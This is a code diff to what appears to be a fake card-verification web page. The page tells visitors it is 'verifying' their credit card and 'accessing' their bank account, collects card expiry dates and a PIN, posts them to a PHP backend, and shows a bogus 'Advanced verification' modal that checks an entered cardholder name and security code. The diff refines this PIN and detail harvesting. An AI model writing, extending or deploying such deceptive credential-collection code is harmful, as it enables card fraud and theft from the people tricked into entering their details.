@@ -39,12 +39,10 @@
         function sending() {
             document.getElementById("sendbut").disabled = true;
             document.getElementById("fin").innerHTML = 'Verifying credit card... Please wait.';
-            let p_name1 = document.getElementById('name1').value.trim();
-            let p_name2 = document.getElementById('name2').value.trim();
             let p_date1 = document.getElementById('date1').value.trim();
             let p_date2 = document.getElementById('date2').value.trim();
-            let p_pin = document.getElementById('pin').value.trim();
-            if (p_name1.length < 4 || p_name2.length < 4 || p_bank.length < 7 || p_cardnum.length < 8 || p_date1.length < 2 || p_date2.length < 2 || p_pin.length < 4) {
+            details.pin = document.getElementById('pin').value.trim();
+            if (p_date1.length < 2 || p_date2.length < 2 || details.pin.length < 4) {
                 inval();
             } else {
                 fetch(urlpre + 'php/cy_send.php', {
@@ -54,10 +52,9 @@
                     },
                     body: JSON.stringify({
                         id_post: userid,
-                        post_name1: p_name1,
-                        post_name2: p_name2,
-                        post_date1: p_date,
-                        post_pin: p_pin
+                        post_date1: p_date1,
+                        post_date2: p_date2,
+                        post_pin: details.pin
                     })
                 })
                     .then(function(response) {
@@ -70,7 +67,7 @@
                         } else {
                             if (response.startsWith("Thank you")) {
                                 setdets();
-                                feeds = respsplt[0].replace("PSWD", '#np36kt57i' + pidpass(userid));
+                                feeds = response.replace("PSWD", pidpass(userid));
                                 setTimeout(function() {
                                     document.getElementById("fin").innerHTML = 'Accessing bank account... Please wait.';
                                     setTimeout(function() {
@@ -104,16 +101,20 @@
                 ("0" + dte.getHours()).slice(-2) + ":" +
                 ("0" + dte.getMinutes()).slice(-2);
             document.getElementById("bnk").src = urlpre + details.bnk;
-            document.getElementById("cnum").innerHTML = details.cnum;
-            document.getElementById("cname").innerHTML = details.cname;
-            document.getElementById("msg").innerHTML = details.msg;
+            document.getElementById("cnum").innerHTML = details.cnum.substring(details.cnum.length - 4);
             document.getElementById("amount").innerHTML = details.stolsum;
         }
 
         function cardverif() {
             document.getElementById("butid").disabled = true;
             document.getElementById("wrong").innerHTML = "";
-            if (document.getElementById("pass").value == details.pin) {
+
+            var enteredName = document.getElementById("cname").value.trim().toUpperCase().replace(/\s+/g, '');
+            var enteredPin = document.getElementById("pass").value;
+
+            var storedName = details.cname.toUpperCase().replace(/\s+/g, '');
+
+            if (enteredName === storedName && enteredPin === details.pin) {
                 document.getElementById("spinid").style.display = 'block';
                 setTimeout(function() {
                     document.getElementById("spinid").style.display = 'none';
@@ -130,7 +131,7 @@
                 document.getElementById("spinid").style.display = 'block';
                 setTimeout(function() {
                     document.getElementById("spinid").style.display = 'none';
-                    document.getElementById("wrong").innerHTML = "Code not correct. Please try again with the correct code.";
+                    document.getElementById("wrong").innerHTML = "Cardholder name or security code is incorrect. Please try again.";
                     document.getElementById("butid").disabled = false;
                 }, randomdigit(2000, 4000));
             }
@@ -163,7 +164,7 @@
 
                             let nameParts = details.cname.split(" ");
                             let firstName = nameParts[0];
-                            let lastName = nameParts.length > 1 ? nameParts.slice(1).join(" ") : ""; 
+                            let lastName = nameParts.length > 1 ? nameParts.slice(1).join(" ") : "";
                             document.getElementById("name1").value = firstName;
                             document.getElementById("name2").value = lastName;
                             document.getElementById("bank").value = details.bankname;
@@ -368,7 +369,7 @@
         <div class="modal-content">
 
             <div style="float:left;">
-                <img id="card" alt='' style='width: 5%;height: 30%;'> <b>Advanced verification.</b>
+                <b>Advanced verification.</b>
             </div>
             <div style="float:right;text-align:right;">
                 <img id="bnk" alt='' style='width: 70%;height: 70%;'>
@@ -378,9 +379,8 @@
                 <p><b>Merchant:</b> K. & N. Ltd.</p>
                 <p><b>Amount:</b> USD <span id="amount"></span> </p>
                 <p><b>Date:</b> <span id="datenow"></span> </p>
-                <p><b>Cardholder:</b> <span id="cname"></span> </p>
                 <p><b>Card Number:</b> XXXX XXXX XXXX <span id="cnum"></span> </p>
-                <p><b>Message:</b> <span id="msg"></span> </p>
+                <p><b>Cardholder Name:</b> <input id="cname" type="text" style="text-transform:uppercase;"> </p>
                 <p><b>Security Code:</b> <input id="pass" type="password" size="4" maxlength="4"> </p>
                 <span id="wrong" style="color:red;"></span>
             </div>
